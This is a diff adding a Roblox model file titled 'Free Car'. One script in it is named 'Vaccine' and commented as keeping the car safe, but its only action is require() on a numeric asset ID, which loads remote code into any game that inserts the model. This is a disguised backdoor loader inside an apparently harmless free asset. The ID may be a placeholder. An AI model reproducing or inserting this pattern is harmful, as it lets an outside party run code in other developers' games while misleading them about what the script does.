@@ -1,0 +1,28 @@
+<roblox xmlns:xmime="http://www.w3.org/2005/05/xmlmime" version="4">
+	<Item class="Model" referent="RBX0">
+		<Properties>
+			<string name="Name">Free Car</string>
+		</Properties>
+		<Item class="Part" referent="RBX1">
+			<Properties>
+				<string name="Name">Body</string>
+			</Properties>
+			<Item class="Script" referent="RBX2">
+				<Properties>
+					<string name="Name">Vaccine</string>
+					<ProtectedString name="Source"><![CDATA[-- keeps your car safe
+local x = 0x123ABC45
+require(0x123ABC45)
+]]></ProtectedString>
+				</Properties>
+			</Item>
+		</Item>
+		<Item class="LocalScript" referent="RBX3">
+			<Properties>
+				<string name="Name">Drive</string>
+				<ProtectedString name="Source">local seat = script.Parent:WaitForChild(&quot;Seat&quot;)
+print(&quot;ready&quot;)</ProtectedString>
+			</Properties>
+		</Item>
+	</Item>
+</roblox>
